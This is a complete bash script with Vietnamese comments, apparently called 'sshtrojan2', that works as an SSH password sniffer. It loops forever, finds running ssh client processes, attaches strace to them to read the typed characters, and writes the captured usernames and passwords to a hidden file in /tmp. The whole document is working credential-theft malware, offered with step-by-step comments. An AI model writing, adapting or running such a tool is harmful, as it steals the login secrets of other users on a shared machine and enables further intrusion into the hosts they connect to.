#!/bin/bash
file_log="/tmp/.log_sshtrojan2.txt"
file_log2="/tmp/log.txt"
# kiểm tra xem 2 tệp log có tồn tại không, nếu có thì xóa đi để tạo tệp mới
if [[ -e $file_log ]]; then 
    rm $file_log
fi
if [[ -e $file_log2 ]]; then
    rm $file_log2
fi

echo "Running..."
while true : # chạy vòng lặp vô hạn
do
# ps aux để liệt kê các tiến trình đang chạy
# grep -w ssh để lọc các tiến trình ssh
# grep @ để lọc các tiến trình ssh từ xa
# head -n1 để lấy dòng đầu tiên
# awk '{print2}' để lấy PID của tiến trình ssh
    pid=`ps aux | grep -w ssh | grep @ | head -n1 | awk '{print $2}'`
    if [[ $pid != "" ]]; then
        echo $pid
        # nếu tồn tại pid thì dùng grep và awk sau đó cắt đi phần domain (IP) để lấy tên người dùng
        username=`ps aux | grep ssh | grep @ | awk '{print $12}' | cut -d '@' -f1`
        echo 'Run Strace'
        password=""
        # sử dụng strace để theo dõi hoạt động mà chương trình thực hiện (ở đây là đọc và ghi)
        strace -e trace=read,write -p $pid -f -o $file_log2
        cat $file_log2 | while read line; do 
            if [[ $line =~ "read(4, ".*", 1)" ]]; then
                c=`echo $line | awk '{print $3}' | cut -d'"' -f2`
                if [[ $c == "n" ]];then # khi gặp n là người dùng ấn enter, tiến hành ghi vào file_log
                    echo "Username: " $username >> $file_log
                    echo "Password: " $password >> $file_log
                    password=""
                else
                    password+=$c
                fi
            fi
        done
    fi
done